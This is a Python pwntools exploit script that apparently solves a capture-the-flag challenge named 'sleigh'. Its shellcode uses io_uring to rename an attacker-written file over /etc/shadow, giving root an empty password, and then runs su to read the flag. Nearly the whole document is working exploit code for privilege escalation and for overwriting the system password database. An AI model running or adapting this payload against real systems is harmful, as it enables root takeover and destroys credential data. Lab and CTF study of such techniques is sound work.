#!/usr/bin/env python3

from pwn import *

context.binary = '/challenge/sleigh'
src_path, dst_path = '/tmp/shadow', '/etc/shadow'

sqes_addr = 'rsp'
params_addr = 'rsp + 0x100'
src_addr = 'rsp + 0x200'
dst_addr = 'rsp + 0x300'
ring_addr = 'rsp + 0x1000'

payload = asm(f'''
.fill 100, 1, 0x90
and rsp, -0x1000
sub rsp, 0x2000
mov rdi, rsp
mov rcx, 0x400
xor eax, eax
rep stosq

{'\n'.join(f"mov byte ptr [{src_addr} + 0x{i:x}], '{c}'" for i, c in enumerate(src_path))}
{'\n'.join(f"mov byte ptr [{dst_addr} + 0x{i:x}], '{c}'" for i, c in enumerate(dst_path))}

mov dword ptr [{params_addr} + 0x8], {hex(1 << 0xe)}
lea rax, [{sqes_addr}]
mov qword ptr [{params_addr} + 0x48], rax
lea rax, [{ring_addr}]
mov qword ptr [{params_addr} + 0x70], rax

lea rsi, [{params_addr}]
{shellcraft.io_uring_setup(1, 'rsi')}

mov edx, dword ptr [{params_addr} + 0x30]
mov edx, dword ptr [{ring_addr} + rdx]
mov eax, dword ptr [{params_addr} + 0x2c]
and edx, dword ptr [{ring_addr} + rax]

mov byte ptr [{sqes_addr}], 0x23
lea rax, [{dst_addr}]
mov qword ptr [{sqes_addr} + 0x8], rax
lea rax, [{src_addr}]
mov qword ptr [{sqes_addr} + 0x10], rax

mov eax, dword ptr [{params_addr} + 0x40]
lea rax, [{ring_addr} + rax]
mov dword ptr [rax + rdx * 4], edx
mov eax, dword ptr [{params_addr} + 0x2c]
inc dword ptr [{ring_addr} + rax]

{shellcraft.io_uring_enter(3, 1, 1, 1, 0, 0)}
{shellcraft.exit_group()}
''')

write(src_path, 'root::::::::')

with process() as p:
    info(p.recvlineS())
    p.send(payload)
    info(p.recvlineS())
    p.wait()

with process('su') as p:
    p.sendline(b'cat /flag; exit')
    success(f'Flag: {p.recvallS()}')
